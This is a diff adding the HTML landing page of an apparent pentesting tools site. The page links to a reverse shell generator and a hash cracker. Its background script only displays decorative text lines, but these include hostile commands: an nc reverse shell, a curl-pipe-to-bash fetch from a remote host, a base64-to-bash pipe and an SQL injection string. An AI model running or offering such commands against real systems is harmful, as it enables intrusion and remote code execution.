@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instant Pentesting Tools</title>
+    <style>
+        :root {
+            --primary: #000000; /* Jet black */
+            --secondary: #0a0a0a;
+            --accent: #131313;
+            --highlight: #fe0000;
+            --text: #ffffff; /* Bright white */
+            --glow: rgba(255, 255, 255, 0.7);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--primary);
+            color: var(--text);
+            line-height: 1.6;
+            overflow-x: hidden;
+            position: relative;
+            min-height: 100vh;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        header {
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 20px 0;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(8px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--text);
+            text-decoration: none;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            position: relative;
+        }
+        
+        .logo::after {
+            content: '';
+            position: absolute;
+            left: 0;
+            bottom: -5px;
+            width: 40px;
+            height: 2px;
+            background-color: var(--highlight);
+        }
+        
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+            padding: 100px 20px 40px;
+        }
+        
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at center, rgba(254, 0, 0, 0.2) 0%, rgba(0, 0, 0, 0) 70%);
+            z-index: -1;
+        }
+        
+        .hero-content {
+            text-align: center;
+            width: 100%;
+            max-width: 800px;
+            z-index: 1;
+        }
+        
+        h1 {
+            font-size: clamp(2rem, 5vw, 3.5rem);
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            line-height: 1.2;
+            position: relative;
+            display: inline-block;
+        }
+        
+        h1::after {
+            content: '';
+            position: absolute;
+            left: 50%;
+            bottom: -15px;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 3px;
+            background-color: var(--highlight);
+        }
+        
+        .tools-container {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin-top: 60px;
+            width: 100%;
+        }
+        
+        .tool-card {
+            background-color: rgba(10, 10, 10, 0.6);
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 30px;
+            width: 100%;
+            max-width: 330px;
+            text-align: center;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .tool-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 5px;
+            height: 100%;
+            background: var(--highlight);
+            transform: scaleY(0);
+            transform-origin: bottom;
+            transition: transform 0.4s;
+        }
+        
+        .tool-card:hover {
+            transform: translateY(-15px);
+            box-shadow: 0 15px 30px rgba(254, 0, 0, 0.2);
+            border-color: rgba(255, 255, 255, 0.3);
+        }
+        
+        .tool-card:hover::before {
+            transform: scaleY(1);
+        }
+        
+        .tool-icon {
+            font-size: 40px;
+            margin-bottom: 20px;
+            color: var(--highlight);
+        }
+        
+        .tool-card h3 {
+            font-size: 1.6rem;
+            margin-bottom: 15px;
+            position: relative;
+            padding-bottom: 15px;
+        }
+        
+        .tool-card h3::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 40px;
+            height: 2px;
+            background-color: rgba(255, 255, 255, 0.3);
+        }
+        
+        .tool-card p {
+            margin-bottom: 25px;
+            font-size: 0.95rem;
+            color: rgba(255, 255, 255, 0.8);
+        }
+        
+        .btn {
+            display: inline-block;
+            background-color: transparent;
+            color: var(--text);
+            padding: 12px 30px;
+            border: 1px solid var(--highlight);
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-size: 0.85rem;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: var(--highlight);
+            transform: scaleX(0);
+            transform-origin: right;
+            transition: transform 0.3s ease;
+            z-index: -1;
+        }
+        
+        .btn:hover {
+            color: white;
+        }
+        
+        .btn:hover::before {
+            transform: scaleX(1);
+            transform-origin: left;
+        }
+        
+        footer {
+            padding: 20px 0;
+            text-align: center;
+            font-size: 14px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            margin-top: 60px;
+        }
+        
+        /* Code-like design element */
+        .code-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.05;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        
+        .code-line {
+            position: absolute;
+            font-family: monospace;
+            color: var(--text);
+            font-size: 12px;
+            white-space: nowrap;
+            opacity: 0.5;
+        }
+        
+        /* Report tab styles */
+        .report-tab {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 99;
+            text-decoration: none;
+        }
+        
+        .report-button {
+            display: flex;
+            align-items: center;
+            background-color: rgba(10, 10, 10, 0.8);
+            color: var(--text);
+            border: 1px solid var(--highlight);
+            border-radius: 5px;
+            padding: 10px 15px;
+            font-size: 0.85rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(5px);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1), 0 0 15px rgba(254, 0, 0, 0.2);
+        }
+        
+        .report-icon {
+            margin-right: 8px;
+            font-size: 16px;
+        }
+        
+        .report-button:hover {
+            background-color: var(--highlight);
+            transform: translateY(-5px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 0 20px rgba(254, 0, 0, 0.3);
+        }
+        
+        .report-button::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, transparent, var(--highlight), transparent);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .report-button:hover::after {
+            opacity: 1;
+        }
+        
+        /* Pulse animation for the report button */
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(254, 0, 0, 0.4);
+            }
+            70% {
+                box-shadow: 0 0 0 10px rgba(254, 0, 0, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(254, 0, 0, 0);
+            }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        /* Responsive styles - improved */
+        @media (max-width: 768px) {
+            .logo {
+                font-size: 18px;
+            }
+            
+            .hero {
+                padding-top: 80px;
+            }
+            
+            .tools-container {
+                gap: 20px;
+                margin-top: 40px;
+            }
+            
+            .tool-card {
+                padding: 25px 20px;
+                max-width: 100%;
+            }
+            
+            .tool-card h3 {
+                font-size: 1.4rem;
+            }
+            
+            .btn {
+                padding: 10px 20px;
+            }
+            
+            .report-tab {
+                bottom: 10px;
+                right: 10px;
+            }
+            
+            .report-button {
+                padding: 8px 12px;
+                font-size: 0.75rem;
+            }
+        }
+        
+        /* Extra small devices */
+        @media (max-width: 480px) {
+            .container {
+                padding: 0 15px;
+            }
+            
+            .logo {
+                font-size: 16px;
+            }
+            
+            h1 {
+                font-size: 1.8rem;
+            }
+            
+            .tool-card {
+                padding: 20px 15px;
+            }
+            
+            .tool-icon {
+                font-size: 32px;
+            }
+            
+            .tool-card h3 {
+                font-size: 1.3rem;
+            }
+            
+            .tool-card p {
+                font-size: 0.9rem;
+            }
+            
+            .btn {
+                padding: 8px 15px;
+                font-size: 0.8rem;
+            }
+            
+            footer {
+                padding: 15px 0;
+                margin-top: 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <nav>
+                <a href="#" class="logo">Instant Pentesting Tools</a>
+                <div>
+                    <!-- Future navigation links will go here -->
+                </div>
+            </nav>
+        </div>
+    </header>
+    
+    <section class="hero">
+        <div class="code-bg" id="codeBg"></div>
+        <div class="hero-content">
+            <h1>Instant Pentesting Tools</h1>
+            <div class="tools-container">
+                <div class="tool-card">
+                    <div class="tool-icon">⚡</div>
+                    <h3>Reverse Shell Generator</h3>
+                    <p>Generate custom reverse shells for multiple platforms with one click. Supports various programming languages and connection methods.</p>
+                    <a href="reverse-shell.html" class="btn">Enter</a>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-icon">🔓</div>
+                    <h3>Hash Cracker</h3>
+                    <p>Fast identification and cracking of common hash types. Supports MD5, SHA1, SHA256, and many other hash algorithms.</p>
+                    <a href="hash-cracker.html" class="btn">Enter</a>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <!-- Report Tab -->
+    <a href="report.html" class="report-tab">
+        <div class="report-button pulse">
+            <span class="report-icon">🔴</span>
+            Report an Issue
+        </div>
+    </a>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 ThreatRecon.io - All Rights Reserved</p>
+        </div>
+    </footer>
+    
+    <script>
+        // Animate the code background
+        document.addEventListener('DOMContentLoaded', function() {
+            const codeBg = document.getElementById('codeBg');
+            const codeSnippets = [
+                "GET /api/v1/users HTTP/1.1",
+                "nc -e /bin/sh 10.0.0.1 1234",
+                "SELECT * FROM users WHERE username='admin'--",
+                "python -c 'import socket,os,pty;s=socket.socket()'",
+                "curl -s https://10.10.14.14/shell.sh | bash",
+                "ssh-keygen -t rsa -b 4096",
+                "echo 'c2gg' | base64 -d | bash",
+                "sudo -l",
+                "find / -perm -u=s -type f 2>/dev/null",
+                "hashcat -m 0 -a 0 hash.txt wordlist.txt",
+                "nmap -sC -sV -oA scan 10.10.10.10"
+            ];
+            
+            // Create random code lines - reduced number for mobile
+            const lineCount = window.innerWidth < 768 ? 15 : 30;
+            
+            for (let i = 0; i < lineCount; i++) {
+                const line = document.createElement('div');
+                line.classList.add('code-line');
+                line.textContent = codeSnippets[Math.floor(Math.random() * codeSnippets.length)];
+                line.style.top = `${Math.random() * 100}%`;
+                line.style.left = `${Math.random() * 100 - 50}%`;
+                line.style.opacity = Math.random() * 0.5 + 0.1;
+                codeBg.appendChild(line);
+            }
+            
+            // Smooth scroll for buttons
+            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    
+                    const targetId = this.getAttribute('href');
+                    if (targetId === '#') return;
+                    
+                    const targetElement = document.querySelector(targetId);
+                    if (targetElement) {
+                        targetElement.scrollIntoView({
+                            behavior: 'smooth',
+                            block: 'start'
+                        });
+                    }
+                });
+            });
+            
+            // Stop pulsing animation after a few seconds
+            setTimeout(() => {
+                document.querySelector('.pulse').classList.remove('pulse');
+            }, 10000);
+            
+            // Handle window resize
+            window.addEventListener('resize', function() {
+                // You could add additional responsive adjustments here if needed
+            });
+        });
+    </script>
+</body>
+</html>
